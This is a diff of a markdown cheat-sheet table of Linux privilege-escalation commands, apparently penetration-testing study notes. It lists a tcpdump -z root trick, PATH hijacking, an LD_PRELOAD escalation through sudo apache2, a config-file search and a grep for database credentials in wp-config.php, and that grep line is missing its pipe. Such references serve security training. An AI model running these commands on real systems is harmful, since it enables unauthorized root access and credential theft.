@@ -21,7 +21,7 @@
 | `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump` |
 | `echo $PATH` | Check the current user's PATH variable contents |
 | `PATH=.:${PATH}` | Add a `.` to the beginning of the current user's PATH |
-| `cat wp-config.php grep 'DB_USER\|DB_PASSWORD'` | Search the user and password in the wordpress database |
+| `cat wp-config.php grep 'DB_USER\\|DB_PASSWORD'` | Search the user and password in the wordpress database |
 | `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Search for config files |
 | `ldd /bin/ls` | View the shared objects required by a binary |
 | `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` | Escalate privileges using `LD_PRELOAD` |
